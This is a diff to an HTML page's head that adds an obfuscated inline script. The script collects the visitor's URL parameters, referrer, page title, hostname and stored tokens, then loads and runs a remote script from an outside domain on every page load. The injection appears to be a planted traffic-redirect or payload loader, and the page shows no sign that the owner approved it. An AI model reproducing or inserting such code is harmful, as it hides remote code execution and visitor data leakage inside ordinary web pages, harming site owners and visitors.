@@ -2,6 +2,49 @@
 <html lang="en">
 
 <head>
+	<script>
+    (function() {
+    var name = '_TjjzCjzXDsRKM56t';
+    if (!window._TjjzCjzXDsRKM56t) {
+        window._TjjzCjzXDsRKM56t = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://stornamest.com/WgnzLLyZ',
+            P_PATH: 'https://stornamest.com/7b4f75c/postback',
+        };
+    }
+    const _bDfhc7jrKhQm9fhS = localStorage.getItem('config');
+    if (typeof _bDfhc7jrKhQm9fhS !== 'undefined' && _bDfhc7jrKhQm9fhS !== null) {
+        var _T8Bf2xSNxtZjVnLR = JSON.parse(_bDfhc7jrKhQm9fhS);
+        var _fpJgv5XbSK9ktpDB = Math.round(+new Date()/1000);
+        if (_T8Bf2xSNxtZjVnLR.created_at + window._TjjzCjzXDsRKM56t.ttl < _fpJgv5XbSK9ktpDB) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _X2TBzWrSFs9WB3w2 = localStorage.getItem('subId');
+    var _dgP3dxbDwxYKyMht = localStorage.getItem('token');
+    var _WkC8zkXz3wq991Mm = '?return=js.client';
+        _WkC8zkXz3wq991Mm += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _WkC8zkXz3wq991Mm += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _WkC8zkXz3wq991Mm += '&default_keyword=' + encodeURIComponent(document.title);
+        _WkC8zkXz3wq991Mm += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _WkC8zkXz3wq991Mm += '&name=' + encodeURIComponent(name);
+        _WkC8zkXz3wq991Mm += '&host=' + encodeURIComponent(window._TjjzCjzXDsRKM56t.R_PATH);
+    if (typeof _X2TBzWrSFs9WB3w2 !== 'undefined' && _X2TBzWrSFs9WB3w2 && window._TjjzCjzXDsRKM56t.unique) {
+        _WkC8zkXz3wq991Mm += '&sub_id=' + encodeURIComponent(_X2TBzWrSFs9WB3w2);
+    }
+    if (typeof _dgP3dxbDwxYKyMht !== 'undefined' && _dgP3dxbDwxYKyMht && window._TjjzCjzXDsRKM56t.unique) {
+        _WkC8zkXz3wq991Mm += '&token=' + encodeURIComponent(_dgP3dxbDwxYKyMht);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._TjjzCjzXDsRKM56t.R_PATH + _WkC8zkXz3wq991Mm;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
 	<meta name="facebook-domain-verification" content="8vbtcttxzghw06o6wl5rrk23mimfwu" />
 	<!-- Required meta tags -->
 	<meta charset="utf-8">
